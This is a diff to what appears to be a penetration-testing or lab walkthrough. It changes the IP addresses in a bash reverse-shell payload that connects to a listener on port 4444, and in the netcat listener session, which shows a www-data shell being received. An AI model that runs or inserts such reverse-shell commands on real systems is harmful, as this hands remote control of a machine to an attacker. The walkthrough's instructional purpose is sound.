@@ -41,12 +41,12 @@ Listening on 0.0.0.0 4444
 
 ```bash
 # victim (generated bash payload)
-bash -i >& /dev/tcp/10.0.0.5/4444 0>&1
+bash -i >& /dev/tcp/198.51.100.9/4444 0>&1
 ```
 
 ```shell-session
 attacker$ nc -lvnp 4444
-Connection received on 10.0.0.20 51234
+Connection received on 10.10.20.20 51234
 victim$ id
 uid=33(www-data) gid=33(www-data)
 ```
